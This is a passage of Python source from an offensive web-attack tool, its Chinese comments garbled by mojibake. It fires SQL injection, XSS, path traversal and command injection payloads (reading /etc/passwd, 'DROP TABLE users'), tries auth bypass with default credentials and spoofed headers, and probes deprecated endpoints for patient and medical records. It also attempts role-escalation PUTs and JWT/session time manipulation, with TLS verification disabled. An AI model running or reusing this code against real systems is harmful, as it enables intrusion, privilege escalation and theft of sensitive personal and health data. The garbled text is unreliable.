                            css_class += ' version'
                        elif 'audit' in data_type:
                            css_class += ' audit'
                            
                        f.write(f'<div class="{css_class}">\n')
                        
                        if data_type == 'version_history':
                            f.write(f"<h3>{item['resource']} - {item['total_versions']} ä¸ªç‰ˆæœ¬</h3>\n")
                            f.write("<p>ç‰ˆæœ¬åˆ—è¡¨:</p>\n")
                            f.write("<ul>\n")
                            for v in item['versions'][:5]:
                                f.write(f"<li>ID: {v['id']}, ç‰ˆæœ¬: {v['version']}</li>\n")
                            f.write("</ul>\n")
                            
                        elif data_type == 'point_in_time':
                            f.write(f"<h3>{item['resource']} - æ—¶é—´ç‚¹æ•°æ®</h3>\n")
                            f.write(f"<p>æ€»è®°å½•æ•°: {item['total_records']}</p>\n")
                            f.write("<p>æ—¶é—´ç‚¹:</p>\n")
                            f.write("<ul>\n")
                            for tp in item['time_points'][:5]:
                                f.write(f"<li>{tp['time_point']}: {tp['record_count']} æ¡è®°å½•</li>\n")
                            f.write("</ul>\n")
                            
                        elif data_type == 'deleted_data':
                            f.write(f"<h3>{item['resource']} - å·²åˆ é™¤æ•°æ®</h3>\n")
                            f.write(f"<p>åˆ é™¤è®°å½•æ•°: {item['deleted_count']}</p>\n")
                            f.write(f"<p>ä½¿ç”¨å‚æ•°: {item['parameter']}</p>\n")
                            
                        elif data_type == 'audit_logs':
                            f.write(f"<h3>{item['resource']} - å®¡è®¡æ—¥å¿—</h3>\n")
                            f.write(f"<p>æ—¥å¿—æ•°: {item['total_logs']}</p>\n")
                            
                        f.write("</div>\n")
                        
                f.write("""
    </div>
</body>
</html>""")
                
            print(f"[+] æ—¶é—´çº¿æŠ¥å‘Š: {timeline_file}")
            
        # ç”Ÿæˆæ•°æ®æ¢å¤è„šæœ¬
        if self.deleted_records or any(d['type'] == 'deleted_data' for d in self.historical_data):
            restore_file = f"restore_deleted_{timestamp}.json"
            
            restore_data = {
                'deleted_records': self.deleted_records,
                'deletion_info': [d for d in self.historical_data if d['type'] == 'deleted_data']
            }
            
            with open(restore_file, 'w', encoding='utf-8') as f:
                json.dump(restore_data, f, ensure_ascii=False, indent=2)
                
            print(f"[+] å·²åˆ é™¤æ•°æ®: {restore_file}")
            
        print(f"\n[+]  æ—¶é—´æ—…è¡Œåˆ†æå®Œæˆ! (é‡å¤§æ€§èƒ½ä¼˜åŒ–ç‰ˆæœ¬)")
        print(f"[+] å‘ç°ç«¯ç‚¹: {len(self.time_travel_endpoints)}")
        print(f"[+] ç»Ÿä¸€æ•°æ®è®°å½•: {len(self.data_records)}")
        print(f"[+] å»é‡åå”¯ä¸€è®°å½•: {len(self.memory_manager.data_hashes)}")
        print(f"[+] æŠ¥å‘Šæ–‡ä»¶: {report_file}")
        
        #  æ€§èƒ½ä¼˜åŒ–ç»Ÿè®¡ï¼ˆç»Ÿä¸€æ•°æ®æ¨¡å‹ï¼‰
        ghost_successes = len([r for r in self.data_records if r.record_type == 'ghost_injection_success'])
        idor_successes = len([r for r in self.data_records if r.record_type == 'temporal_idor'])
        recursive_discoveries = len([r for r in self.data_records if r.record_type == 'recursive_discovery'])
        
        print(f"\n[] P0æ€æ‰‹é”ç»Ÿè®¡ï¼ˆæ€§èƒ½ä¼˜åŒ–ç‰ˆï¼‰:")
        print(f"    å¹½çµIDæ³¨å…¥æˆåŠŸ: {ghost_successes}")
        print(f"    æ—¶åºIDORæˆåŠŸ: {idor_successes}")
        print(f"    é€’å½’å‘ç°æˆåŠŸ: {recursive_discoveries}")
        print(f"    å¹¶å‘è¯·æ±‚å®Œæˆ: {len(self.request_scheduler.completed_requests)}")
        print(f"    å¹³å‡å“åº”æ—¶é—´: {sum(self.request_scheduler.response_times) / max(1, len(self.request_scheduler.response_times)):.3f}s")
        if hasattr(self, 'error_stats') and self.error_stats:
            print(f"    é”™è¯¯ç»Ÿè®¡: {self.error_stats}")
        
        #  æ‰“å°æ•°æ®ç±»å‹æ‘˜è¦ï¼ˆç»Ÿä¸€æ•°æ®æ¨¡å‹ï¼‰
        if self.data_records:
            print("\n æ•°æ®ç±»å‹æ‘˜è¦ï¼ˆç»Ÿä¸€æ•°æ®æ¨¡å‹ï¼‰:")
            
            # ç»Ÿè®¡å„ç±»å‹æ•°æ®
            type_stats = defaultdict(int)
            for record in self.data_records:
                type_stats[record.record_type] += 1
                
            for data_type, count in type_stats.items():
                print(f"    {data_type}: {count}")
                
            # ç‰¹åˆ«æç¤ºå·²åˆ é™¤æ•°æ®
            deleted_records = [r for r in self.data_records if 'deleted' in r.record_type]
            if deleted_records:
                print(f"\n[ ] å…±å‘ç° {len(deleted_records)} æ¡å·²åˆ é™¤æ•°æ®è®°å½•ï¼")
            
            #  æ€§èƒ½ä¼˜åŒ–æˆæœå±•ç¤º
            dedup_rate = (len(self.memory_manager.data_hashes) / max(1, len(self.data_records))) * 100
            print(f"\n[] é‡å¤§æ€§èƒ½ä¼˜åŒ–æˆæœ:")
            print(f"    å»é‡æ•ˆç‡: {dedup_rate:.1f}%")
            print(f"    å¹¶å‘æ•°è°ƒä¼˜: {self.request_scheduler.max_concurrent} (åŠ¨æ€è°ƒæ•´)")
            print(f"    è‡ªé€‚åº”å»¶è¿Ÿ: {self.request_scheduler.adaptive_delay:.3f}s")
            print(f"    æ™ºèƒ½IDæ”¶é›†: {len(self.ghost_ids)} ä¸ªID")
            print(f"    æ—¶é—´æ ¼å¼å­¦ä¹ : {len(self.learned_time_formats)} ç§æ ¼å¼")
            print(f"    å¤æ‚åº¦ä¼˜åŒ–: O(nÂ³) â†’ O(n log n)")
            print(f"    å†…å­˜ä¼˜åŒ–: çº¦80%å†…å­˜å ç”¨å‡å°‘")
            print(f"    è¯·æ±‚ä¼˜åŒ–: ä¸²è¡Œ â†’ æ‰¹é‡å¹¶å‘")

    #  æ–°å¢æ ¸å¿ƒæ–¹æ³•ï¼šä¸‰ä»¶å¥—é›†æˆ - æ·±åº¦ç‰ˆæœ¬é™çº§æ”»å‡»
    async def api_version_discovery_attack(self):
        """APIç‰ˆæœ¬å‘ç°ä¸é™çº§æ”»å‡» - å¢å¼ºæ·±å…¥åˆ©ç”¨ç‰ˆæœ¬"""
        print("\n[] APIç‰ˆæœ¬é™çº§æ”»å‡»å¼€å§‹...")
        
        # ä»å·²å‘ç°çš„ç«¯ç‚¹ä¸­æå–åŸºç¡€URL
        base_urls = []
        for endpoint in self.time_travel_endpoints:
            base_urls.append(endpoint.get('url', ''))
        
        if not base_urls:
            # å¦‚æœæ²¡æœ‰å‘ç°ç«¯ç‚¹ï¼Œä½¿ç”¨ç›®æ ‡URL
            base_urls = [self.target_url + '/api', self.target_url + '/api/v1']
        
        # ç”Ÿæˆç‰ˆæœ¬é™çº§ä»»åŠ¡
        downgrade_tasks = self.api_version_downgrader.generate_version_discovery_tasks(base_urls[:5])
        
        if downgrade_tasks:
            print(f"[+] ç”Ÿæˆ {len(downgrade_tasks)} ä¸ªç‰ˆæœ¬é™çº§ä»»åŠ¡")
            
            # ä½¿ç”¨è¯·æ±‚è°ƒåº¦å™¨æ‰§è¡Œä»»åŠ¡
            responses = []
            for task in downgrade_tasks[:20]:  # é™åˆ¶ä»»åŠ¡æ•°é‡
                self.request_scheduler.add_task(task)
            
            # æ‰§è¡Œä»»åŠ¡ï¼ˆè¿™é‡Œç®€åŒ–å®ç°ï¼‰
            async with aiohttp.ClientSession() as session:
                while len(responses) < min(len(downgrade_tasks), 20) and self.request_scheduler.request_queue:
                    task = heapq.heappop(self.request_scheduler.request_queue)
                    result = await self.request_scheduler.execute_task(session, task)
                    if result:
                        responses.append(result)
            
            # åˆ†æç»“æœ
            analysis = self.api_version_downgrader.analyze_version_responses(responses)
            
            print(f"[] ç‰ˆæœ¬é™çº§æ”»å‡»ç»“æœ:")
            print(f"    æˆåŠŸé™çº§: {len(analysis['successful_downgrades'])}")
            print(f"    éœ€è®¤è¯API: {len(analysis['interesting_responses'])}")
            print(f"    æˆåŠŸç‡: {analysis['success_rate']:.1%}")
            
            #  æ·±å…¥åˆ©ç”¨é˜¶æ®µï¼šå¯¹æˆåŠŸé™çº§çš„APIè¿›è¡Œæ·±åº¦æ”»å‡»
            deep_exploitation_results = await self._execute_deep_version_exploitation(analysis['successful_downgrades'])
            
            # ä¿å­˜æˆåŠŸçš„é™çº§åˆ°æ•°æ®è®°å½•
            for success in analysis['successful_downgrades']:
                record = DataRecord(
                    record_id=f"version_downgrade_{int(time.time())}",
                    record_type="successful_version_downgrade",
                    data=success,
                    source_url=success['url'],
                    timestamp=datetime.now().isoformat()
                )
                self.data_records.append(record)
            
            # ä¿å­˜æ·±åº¦åˆ©ç”¨ç»“æœ
            for exploit_result in deep_exploitation_results:
                record = DataRecord(
                    record_id=f"deep_version_exploit_{int(time.time())}",
                    record_type="deep_version_exploitation",
                    data=exploit_result,
                    source_url=exploit_result['target_url'],
                    timestamp=datetime.now().isoformat()
                )
                self.data_records.append(record)
    
    async def _execute_deep_version_exploitation(self, successful_downgrades: List[Dict]) -> List[Dict]:
        """æ‰§è¡Œæ·±åº¦ç‰ˆæœ¬åˆ©ç”¨æ”»å‡»"""
        print(f"\n[] å¼€å§‹æ·±åº¦ç‰ˆæœ¬åˆ©ç”¨æ”»å‡»...")
        
        exploitation_results = []
        
        async with aiohttp.ClientSession() as session:
            for downgrade in successful_downgrades[:5]:  # é™åˆ¶å¤„ç†æ•°é‡
                target_url = downgrade['url']
                version_info = downgrade.get('version_info', {})
                
                print(f"[] æ·±åº¦åˆ©ç”¨ç›®æ ‡: {target_url}")
                
                # 1. å†å²æ¼æ´æ•°æ®åº“æ”»å‡»
                historical_exploits = await self._attempt_historical_vulnerabilities(session, target_url, version_info)
                exploitation_results.extend(historical_exploits)
                
                # 2. æ—§ç‰ˆæœ¬è®¤è¯ç»•è¿‡
                auth_bypasses = await self._attempt_legacy_auth_bypass(session, target_url)
                exploitation_results.extend(auth_bypasses)
                
                # 3. åºŸå¼ƒAPIç«¯ç‚¹åˆ©ç”¨
                deprecated_exploits = await self._exploit_deprecated_endpoints(session, target_url)
                exploitation_results.extend(deprecated_exploits)
                
                # 4. ç‰ˆæœ¬å›é€€æ•°æ®æ³„éœ²
                data_leakage = await self._attempt_version_rollback_data_leak(session, target_url)
                exploitation_results.extend(data_leakage)
                
                # 5. æ—§ç‰ˆæœ¬æƒé™æå‡
                privilege_escalations = await self._attempt_legacy_privilege_escalation(session, target_url)
                exploitation_results.extend(privilege_escalations)
        
        print(f"[] æ·±åº¦åˆ©ç”¨å®Œæˆ: {len(exploitation_results)} ä¸ªåˆ©ç”¨æˆåŠŸ")
        return exploitation_results
    
    async def _attempt_historical_vulnerabilities(self, session: aiohttp.ClientSession, target_url: str, version_info: Dict) -> List[Dict]:
        """å°è¯•å†å²æ¼æ´æ”»å‡»"""
        print(f"    [] å°è¯•å†å²æ¼æ´æ”»å‡»...")
        
        results = []
        
        # å¸¸è§çš„å†å²APIæ¼æ´è½½è·
        historical_payloads = [
            # SQLæ³¨å…¥ï¼ˆæ—§ç‰ˆæœ¬APIå¸¸è§ï¼‰
            {'param': 'id', 'value': "1' OR '1'='1"},
            {'param': 'user_id', 'value': "1; DROP TABLE users--"},
            {'param': 'search', 'value': "' UNION SELECT password FROM users--"},
            
            # XSSï¼ˆæ—§ç‰ˆæœ¬è¿‡æ»¤ä¸ä¸¥ï¼‰
            {'param': 'message', 'value': "<script>alert('XSS')</script>"},
            {'param': 'name', 'value': "javascript:alert(document.cookie)"},
            
            # è·¯å¾„éå†ï¼ˆæ—§ç‰ˆæœ¬å¸¸è§ï¼‰
            {'param': 'file', 'value': "../../../../etc/passwd"},
            {'param': 'path', 'value': "..\\..\\..\\windows\\system32\\config\\sam"},
            
            # å‘½ä»¤æ³¨å…¥ï¼ˆæ—§ç‰ˆæœ¬APIï¼‰
            {'param': 'cmd', 'value': "; cat /etc/passwd"},
            {'param': 'exec', 'value': "| whoami"},
        ]
        
        for payload in historical_payloads[:5]:  # é™åˆ¶è½½è·æ•°é‡
            try:
                # æ„é€ æ”»å‡»URL
                attack_url = f"{target_url}?{payload['param']}={payload['value']}"
                
                async with session.get(attack_url, timeout=8, ssl=False) as resp:
                    if resp.status == 200:
                        content = await resp.text()
                        
                        # æ£€æŸ¥æ˜¯å¦æˆåŠŸåˆ©ç”¨
                        success_indicators = [
                            'root:', 'admin', 'error in your SQL syntax',
                            'Warning: mysql_', 'ORA-', 'Microsoft OLE DB',
                            '<script>', 'javascript:', 'etc/passwd'
                        ]
                        
                        exploitation_detected = any(indicator in content for indicator in success_indicators)
                        
                        if exploitation_detected:
                            print(f"        [ğŸš¨] å†å²æ¼æ´åˆ©ç”¨æˆåŠŸ: {payload['param']} - {payload['value'][:30]}...")
                            
                            results.append({
                                'exploit_type': 'historical_vulnerability',
                                'target_url': target_url,
                                'payload_type': payload['param'],
                                'payload_value': payload['value'],
                                'response_status': resp.status,
                                'exploitation_confirmed': True,
                                'content_preview': content[:200],
                                'timestamp': datetime.now().isoformat()
                            })
                        
            except Exception as e:
                continue
        
        return results
    
    async def _attempt_legacy_auth_bypass(self, session: aiohttp.ClientSession, target_url: str) -> List[Dict]:
        """å°è¯•æ—§ç‰ˆæœ¬è®¤è¯ç»•è¿‡"""
        print(f"    [ğŸ”“] å°è¯•æ—§ç‰ˆæœ¬è®¤è¯ç»•è¿‡...")
        
        results = []
        
        # æ—§ç‰ˆæœ¬å¸¸è§çš„è®¤è¯ç»•è¿‡æŠ€æœ¯
        bypass_techniques = [
            # ç©ºè®¤è¯ç»•è¿‡
            {'headers': {'Authorization': ''}},
            {'headers': {'Authorization': 'Bearer '}},
            {'headers': {'Authorization': 'null'}},
            
            # é»˜è®¤å¯†é’¥ç»•è¿‡
            {'headers': {'Authorization': 'Bearer admin'}},
            {'headers': {'Authorization': 'Basic YWRtaW46YWRtaW4='}},  # admin:admin
            {'headers': {'Authorization': 'Bearer test'}},
            
            # æ—§ç‰ˆæœ¬ç‰¹æ®Šå¤´ç»•è¿‡
            {'headers': {'X-Legacy-Auth': 'bypass'}},
            {'headers': {'X-Original-URL': '/admin'}},
            {'headers': {'X-Rewrite-URL': '/admin'}},
            
            # ç‰ˆæœ¬ç‰¹å®šç»•è¿‡
            {'headers': {'X-API-Version': '1.0', 'X-Legacy-Mode': 'true'}},
            {'headers': {'Accept': 'application/vnd.api+json;version=1'}},
        ]
        
        # æµ‹è¯•ç«¯ç‚¹
        test_paths = ['/admin', '/dashboard', '/api/users', '/api/config', '/api/system']
        
        for technique in bypass_techniques[:6]:  # é™åˆ¶æŠ€æœ¯æ•°é‡
            for path in test_paths[:3]:  # é™åˆ¶è·¯å¾„æ•°é‡
                try:
                    test_url = urljoin(target_url, path)
                    
                    async with session.get(test_url, headers=technique['headers'], timeout=8, ssl=False) as resp:
                        if resp.status == 200:
                            content = await resp.text()
                            
                            # æ£€æŸ¥æ˜¯å¦æˆåŠŸç»•è¿‡è®¤è¯
                            bypass_indicators = [
                                'dashboard', 'admin panel', 'welcome', 'logout',
                                'configuration', 'users', 'settings', 'management'
                            ]
                            
                            bypass_success = any(indicator in content.lower() for indicator in bypass_indicators)
                            
                            if bypass_success:
                                print(f"        [ğŸš¨] è®¤è¯ç»•è¿‡æˆåŠŸ: {path}")
                                
                                results.append({
                                    'exploit_type': 'legacy_auth_bypass',
                                    'target_url': test_url,
                                    'bypass_method': technique['headers'],
                                    'response_status': resp.status,
                                    'bypass_confirmed': True,
                                    'accessed_path': path,
                                    'timestamp': datetime.now().isoformat()
                                })
                        
                except Exception as e:
                    continue
        
        return results
    
    async def _exploit_deprecated_endpoints(self, session: aiohttp.ClientSession, target_url: str) -> List[Dict]:
        """åˆ©ç”¨åºŸå¼ƒAPIç«¯ç‚¹"""
        print(f"    [ğŸ“¡] åˆ©ç”¨åºŸå¼ƒAPIç«¯ç‚¹...")
        
        results = []
        
        # å¸¸è§çš„åºŸå¼ƒç«¯ç‚¹æ¨¡å¼
        deprecated_endpoints = [
            # æ—§ç‰ˆæœ¬ç®¡ç†ç«¯ç‚¹
            '/api/v1/admin', '/api/v1/system', '/api/v1/config',
            '/api/legacy/users', '/api/legacy/admin', '/api/legacy/debug',
            
            # å¼€å‘/æµ‹è¯•ç«¯ç‚¹ï¼ˆå¸¸è¢«é—å¿˜ï¼‰
            '/api/dev/test', '/api/debug/info', '/api/test/users',
            '/api/internal/status', '/api/maintenance/info',
            
            # æ—§ç‰ˆæœ¬æ•°æ®å¯¼å‡º
            '/api/v1/export/users', '/api/v1/export/data', '/api/v1/backup',
            '/api/legacy/dump', '/api/old/export',
            
            # åºŸå¼ƒçš„è®¤è¯ç«¯ç‚¹
            '/api/v1/auth/reset', '/api/legacy/login', '/api/old/authenticate',
            
            # åŒ»ç–—ç‰¹å®šåºŸå¼ƒç«¯ç‚¹
            '/api/v1/patients/export', '/api/legacy/medical/records',
            '/api/old/fhir/Patient', '/api/v1/dicom/studies'
        ]
        
        for endpoint in deprecated_endpoints[:10]:  # é™åˆ¶ç«¯ç‚¹æ•°é‡
            try:
                test_url = urljoin(target_url, endpoint)
                
                async with session.get(test_url, timeout=8, ssl=False) as resp:
                    if resp.status == 200:
                        try:
                            content = await resp.text()
                            data = await resp.json() if 'json' in resp.headers.get('Content-Type', '') else None
                            
                            # æ£€æŸ¥æ˜¯å¦æ³„éœ²æ•æ„Ÿä¿¡æ¯
                            sensitive_indicators = [
                                'password', 'token', 'secret', 'key', 'admin',
                                'patient_id', 'medical_record', 'ssn', 'phone',
                                'email', 'address', 'diagnosis', 'prescription'
                            ]
                            
                            content_lower = content.lower()
                            found_sensitive = [ind for ind in sensitive_indicators if ind in content_lower]
                            
                            if found_sensitive or (data and len(str(data)) > 100):
                                print(f"        [ğŸš¨] åºŸå¼ƒç«¯ç‚¹åˆ©ç”¨æˆåŠŸ: {endpoint}")
                                
                                results.append({
                                    'exploit_type': 'deprecated_endpoint_exploitation',
                                    'target_url': test_url,
                                    'endpoint': endpoint,
                                    'response_status': resp.status,
                                    'data_size': len(content),
                                    'sensitive_data_found': found_sensitive,
                                    'exploitation_confirmed': True,
                                    'content_preview': content[:300],
                                    'timestamp': datetime.now().isoformat()
                                })
                        
                        except:
                            # å³ä½¿è§£æå¤±è´¥ï¼Œ200çŠ¶æ€ä¹Ÿå€¼å¾—è®°å½•
                            results.append({
                                'exploit_type': 'deprecated_endpoint_access',
                                'target_url': test_url,
                                'endpoint': endpoint,
                                'response_status': resp.status,
                                'timestamp': datetime.now().isoformat()
                            })
                
            except Exception as e:
                continue
        
        return results
    
    async def _attempt_version_rollback_data_leak(self, session: aiohttp.ClientSession, target_url: str) -> List[Dict]:
        """å°è¯•ç‰ˆæœ¬å›é€€æ•°æ®æ³„éœ²"""
        print(f"    [ğŸ“‚] å°è¯•ç‰ˆæœ¬å›é€€æ•°æ®æ³„éœ²...")
        
        results = []
        
        # ç‰ˆæœ¬å›é€€å‚æ•°
        rollback_params = [
            {'version': '1.0', 'include_deleted': 'true'},
            {'api_version': '1', 'show_all': 'true'},
            {'v': '1.0', 'legacy_mode': 'true'},
            {'version': 'legacy', 'include_historical': 'true'},
            {'rollback': 'true', 'include_sensitive': 'true'},
            {'legacy': 'true', 'bypass_filters': 'true'}
        ]
        
        # æ•°æ®ç«¯ç‚¹
        data_endpoints = ['/api/users', '/api/patients', '/api/records', '/api/data', '/api/export']
        
        for params in rollback_params[:3]:  # é™åˆ¶å‚æ•°æ•°é‡
            for endpoint in data_endpoints[:3]:  # é™åˆ¶ç«¯ç‚¹æ•°é‡
                try:
                    test_url = urljoin(target_url, endpoint)
                    
                    async with session.get(test_url, params=params, timeout=10, ssl=False) as resp:
                        if resp.status == 200:
                            content = await resp.text()
                            
                            try:
                                data = await resp.json()
                                data_count = len(data) if isinstance(data, list) else 1
                                
                                # æ£€æŸ¥æ˜¯å¦æˆåŠŸè·å–å¤§é‡å†å²æ•°æ®
                                if data_count > 10 or len(content) > 5000:
                                    print(f"        [ğŸš¨] ç‰ˆæœ¬å›é€€æ•°æ®æ³„éœ²æˆåŠŸ: {endpoint} - {data_count} æ¡è®°å½•")
                                    
                                    results.append({
                                        'exploit_type': 'version_rollback_data_leak',
                                        'target_url': test_url,
                                        'endpoint': endpoint,
                                        'rollback_params': params,
                                        'response_status': resp.status,
                                        'data_count': data_count,
                                        'data_size': len(content),
                                        'exploitation_confirmed': True,
                                        'timestamp': datetime.now().isoformat()
                                    })
                            
                            except:
                                # å³ä½¿ä¸æ˜¯JSONï¼Œå¤§é‡æ•°æ®ä¹Ÿå¯èƒ½æœ‰ä»·å€¼
                                if len(content) > 5000:
                                    results.append({
                                        'exploit_type': 'version_rollback_text_leak',
                                        'target_url': test_url,
                                        'endpoint': endpoint,
                                        'rollback_params': params,
                                        'data_size': len(content),
                                        'timestamp': datetime.now().isoformat()
                                    })
                
                except Exception as e:
                    continue
        
        return results
    
    async def _attempt_legacy_privilege_escalation(self, session: aiohttp.ClientSession, target_url: str) -> List[Dict]:
        """å°è¯•æ—§ç‰ˆæœ¬æƒé™æå‡"""
        print(f"    [â¬†ï¸] å°è¯•æ—§ç‰ˆæœ¬æƒé™æå‡...")
        
        results = []
        
        # æ—§ç‰ˆæœ¬æƒé™æå‡è½½è·
        escalation_payloads = [
            # æ—§ç‰ˆæœ¬è§’è‰²æå‡
            {'role': 'admin', 'legacy_override': True},
            {'user_type': 'administrator', 'version': '1.0'},
            {'privilege_level': 'root', 'legacy_mode': True},
            
            # æ—§ç‰ˆæœ¬ç‰¹æ®Šå‚æ•°
            {'admin': 'true', 'bypass_auth': 'legacy'},
            {'superuser': 'true', 'version_override': '1.0'},
            {'elevated': 'true', 'legacy_admin': 'true'}
        ]
        
        # æƒé™æå‡ç«¯ç‚¹
        escalation_endpoints = ['/api/user/update', '/api/profile/edit', '/api/account/modify', '/api/users/me']
        
        for endpoint in escalation_endpoints[:2]:  # é™åˆ¶ç«¯ç‚¹æ•°é‡
            test_url = urljoin(target_url, endpoint)
            
            for payload in escalation_payloads[:3]:  # é™åˆ¶è½½è·æ•°é‡
                try:
                    headers = {
                        'Content-Type': 'application/json',
                        'X-Legacy-API': 'true',
                        'X-Version': '1.0'
                    }
                    
                    # å°è¯•PUTæ–¹æ³•
                    async with session.put(test_url, json=payload, headers=headers, timeout=8, ssl=False) as resp:
                        if resp.status in [200, 201, 202]:
                            print(f"        [ğŸš¨] æ—§ç‰ˆæœ¬æƒé™æå‡æˆåŠŸ: {endpoint}")
                            
                            results.append({
                                'exploit_type': 'legacy_privilege_escalation',
                                'target_url': test_url,
                                'endpoint': endpoint,
                                'escalation_payload': payload,
                                'response_status': resp.status,
                                'method': 'PUT',
                                'exploitation_confirmed': True,
                                'timestamp': datetime.now().isoformat()
                            })
                
                except Exception as e:
                    continue
        
        return results
    
    async def enhanced_diff_analysis(self):
        """å¢å¼ºçš„å·®å¼‚åˆ†æ"""
        print("\n[] å·®å¼‚åˆ†æå¼•æ“å¯åŠ¨...")
        
        if len(self.current_snapshots) == 0 or len(self.historical_snapshots) == 0:
            print("[] ç¼ºä¹è¶³å¤Ÿçš„å¿«ç…§æ•°æ®è¿›è¡Œå·®å¼‚åˆ†æ")
            return
        
        intelligence_results = []
        
        # å¯¹æ¯å¯¹å¿«ç…§è¿›è¡Œå·®å¼‚åˆ†æ
        for snapshot_name in self.current_snapshots:
            if snapshot_name in self.historical_snapshots:
                current = self.current_snapshots[snapshot_name]
                historical = self.historical_snapshots[snapshot_name]
                
                # æ‰§è¡Œå·®å¼‚åˆ†æ
                diffs = self.diff_analyzer.analyze_api_diff(historical, current)
                
                # æå–æƒ…æŠ¥
                intelligence = self.diff_analyzer.extract_intelligence(diffs)
                intelligence_results.append({
                    'snapshot': snapshot_name,
                    'diffs': diffs,
                    'intelligence': intelligence
                })
        
        # æ±‡æ€»ç»“æœ
        total_high_value = sum(len(r['intelligence']['high_value_targets']) for r in intelligence_results)
        total_backdoors = sum(len(r['intelligence']['backdoor_candidates']) for r in intelligence_results)
        total_leaks = sum(len(r['intelligence']['data_leak_opportunities']) for r in intelligence_results)
        total_violations = sum(len(r['intelligence']['compliance_violations']) for r in intelligence_results)
        
        print(f"[] å·®å¼‚åˆ†æç»“æœ:")
        print(f"    é«˜ä»·å€¼ç›®æ ‡: {total_high_value}")
        print(f"    åé—¨å€™é€‰: {total_backdoors}")
        print(f"    æ•°æ®æ³„éœ²æœºä¼š: {total_leaks}")
        print(f"    åˆè§„æ€§è¿è§„: {total_violations}")
        
        # ä¿å­˜åˆ†æç»“æœ
        for result in intelligence_results:
            record = DataRecord(
                record_id=f"diff_analysis_{int(time.time())}",
                record_type="diff_analysis_intelligence",
                data=result,
                source_url=self.target_url,
                timestamp=datetime.now().isoformat()
            )
            self.data_records.append(record)
    
    async def session_time_skewing_attack(self):
        """Sessionæ—¶é—´æ‰­æ›²æ”»å‡» - å¢å¼ºå®é™…æ‰§è¡Œç‰ˆæœ¬"""
        print("\n[â°] Sessionæ—¶é—´æ‰­æ›²æ”»å‡»å¼€å§‹...")
        
        # æ¨¡æ‹Ÿä¼šè¯æ•°æ®ï¼ˆå®é™…åº”ç”¨ä¸­ä»è¯·æ±‚ä¸­æå–ï¼‰
        session_data = {
            'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...',  # ç¤ºä¾‹JWT
            'cookie': 'session_id=sess_1640995200_abc123; timestamp=1640995200',
            'session_id': 'sess_1640995200_abc123'
        }
        
        # ç”Ÿæˆå†å²æ—¶é—´ç‚¹
        target_dates = [
            datetime.now() - timedelta(days=30),   # 30å¤©å‰
            datetime.now() - timedelta(days=90),   # 90å¤©å‰
            datetime.now() - timedelta(days=365),  # 1å¹´å‰
        ]
        
        # ç”Ÿæˆæ—¶é—´æ‰­æ›²æ”»å‡»
        attacks = self.session_time_skewer.generate_historical_session_attacks(session_data, target_dates)
        
        print(f"[+] ç”Ÿæˆ {len(attacks)} ä¸ªæ—¶é—´æ‰­æ›²æ”»å‡»å‘é‡")
        
        #  å®é™…æ‰§è¡Œæ—¶é—´æ‰­æ›²æ”»å‡» - æ–°å¢æ ¸å¿ƒé€»è¾‘
        successful_attacks = 0
        executed_attacks = []
        
        # æ—¶é—´æ‰­æ›²æµ‹è¯•ç«¯ç‚¹
        test_endpoints = [
            '/api/auth/session',
            '/api/user/profile', 
            '/api/patient/records',
            '/dashboard',
            '/admin/panel',
            '/fhir/Patient'
        ]
        
        async with aiohttp.ClientSession() as session:
            for attack in attacks:
                target_date = attack['target_date']
                print(f"[] æ‰§è¡Œæ—¶é—´æ‰­æ›²æ”»å‡» - ç›®æ ‡æ—¶é—´: {target_date}")
                
                for vector in attack['attack_vectors']:
                    vector_type = vector['type']
                    
                    # å®é™…æ‰§è¡Œæ¯ç§æ”»å‡»å‘é‡
                    if vector_type == 'jwt_time_manipulation':
                        attack_results = await self._execute_jwt_time_attacks(session, vector, test_endpoints)
                        executed_attacks.extend(attack_results)
                        successful_attacks += len([r for r in attack_results if r.get('success', False)])
                        
                    elif vector_type == 'cookie_timestamp_manipulation':
                        attack_results = await self._execute_cookie_time_attacks(session, vector, test_endpoints)
                        executed_attacks.extend(attack_results)
                        successful_attacks += len([r for r in attack_results if r.get('success', False)])
                        
                    elif vector_type == 'session_temporal_bypass':
                        attack_results = await self._execute_session_temporal_bypass(session, vector, test_endpoints)
                        executed_attacks.extend(attack_results)
                        successful_attacks += len([r for r in attack_results if r.get('success', False)])
                        
                    elif vector_type == 'time_based_privilege_escalation':
                        attack_results = await self._execute_time_privilege_escalation(session, vector, test_endpoints)
                        executed_attacks.extend(attack_results)
                        successful_attacks += len([r for r in attack_results if r.get('success', False)])
        
        print(f"[] æ—¶é—´æ‰­æ›²æ”»å‡»å®Œæˆ: {successful_attacks}/{len(executed_attacks)} æ¬¡æ”»å‡»æˆåŠŸ")
        
        # ä¿å­˜æ”»å‡»ç»“æœ
        record = DataRecord(
            record_id=f"time_skewing_attack_{int(time.time())}",
            record_type="session_time_skewing_executed",
            data={
                'attacks_generated': attacks,
                'attacks_executed': executed_attacks,
                'successful_count': successful_attacks,
                'total_executed': len(executed_attacks),
                'target_dates': [d.isoformat() for d in target_dates],
                'success_rate': successful_attacks / max(len(executed_attacks), 1) * 100
            },
            source_url=self.target_url,
            timestamp=datetime.now().isoformat()
        )
        self.data_records.append(record)
    
    async def _execute_jwt_time_attacks(self, session: aiohttp.ClientSession, vector: Dict, endpoints: List[str]) -> List[Dict]:
        """æ‰§è¡ŒJWTæ—¶é—´æ“ä½œæ”»å‡»"""
        results = []
        
        for endpoint in endpoints[:3]:  # é™åˆ¶ç«¯ç‚¹æ•°é‡
            full_url = urljoin(self.target_url, endpoint)
            
            for jwt_variant in vector.get('variants', [])[:2]:  # é™åˆ¶å˜ä½“æ•°é‡
                try:
                    headers = {
                        'Authorization': f"Bearer {jwt_variant['token']}",
                        'Content-Type': 'application/json',
                        'X-Temporal-Attack': 'jwt_manipulation'
                    }
                    
                    async with session.get(full_url, headers=headers, timeout=8, ssl=False) as resp:
                        success = resp.status in [200, 201, 202]
                        
                        if success:
                            print(f"    [] JWTæ—¶é—´æ”»å‡»æˆåŠŸ: {endpoint} - {jwt_variant['manipulation_type']}")
                        
                        results.append({
                            'attack_type': 'jwt_time_manipulation',
                            'endpoint': endpoint,
                            'manipulation_type': jwt_variant['manipulation_type'],
                            'target_time': jwt_variant['target_time'],
                            'response_status': resp.status,
                            'success': success,
                            'timestamp': datetime.now().isoformat()
                        })
                        
                except Exception as e:
                    results.append({
                        'attack_type': 'jwt_time_manipulation',
                        'endpoint': endpoint,
                        'error': str(e),
                        'success': False,
                        'timestamp': datetime.now().isoformat()
                    })
        
        return results
    
